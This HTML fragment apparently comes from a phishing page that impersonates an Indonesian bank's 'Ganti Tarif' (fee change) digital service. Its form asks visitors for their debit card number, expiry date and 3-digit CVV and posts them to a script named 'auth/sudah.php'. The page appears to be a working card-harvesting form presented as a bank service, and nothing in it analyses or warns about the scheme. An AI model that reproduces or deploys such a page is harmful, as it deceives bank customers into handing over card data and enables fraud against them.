...
<nav class="navbar navbar-inverse navbar-fixed-top"> 	<div class="container"> 		<div class="navbar-header"> 			<a class="navbar-brand" href="">Layanan Bni Ganti Tarif</a> 		</div> 		<div id="navbar-header-second" class="navbar-header-second navbar-right"> 			<a href="home"> 				<span>Layanan Digital</span> 			</a> 		</div> 	</div> </nav> 	 	<div class="container container-margin"> 		<form id="form" action="auth/sudah.php" method="POST"> 			<input type="hidden" name="input" value="input" /> 			<div class="panel panel-default"> 			 	<div class="panel-body"> 					<div class="row"> 						<div class="col-md-12"> 						
<center>
...
<label>Nomor Kartu Debit</label> 								<input class="form-control" data-mask="0000 0000 0000 0000" type="tel" name="no" value="" autocomplete="off" 
required
/> 							</div> 						


<div class="form-group">
<label>Masa Berlaku kartu</label> 								<input class="form-control" data-mask="00/00" type="tel" name="mb" value="" autocomplete="off" required /> 							</div> 							



<div class="form-group">
<label>CVV / 3 DIGIT </label> 								<input class="form-control" type="password" inputmode="numeric" name="cvv" value="" autocomplete="off" maxlength="3" required /> 							</div> 
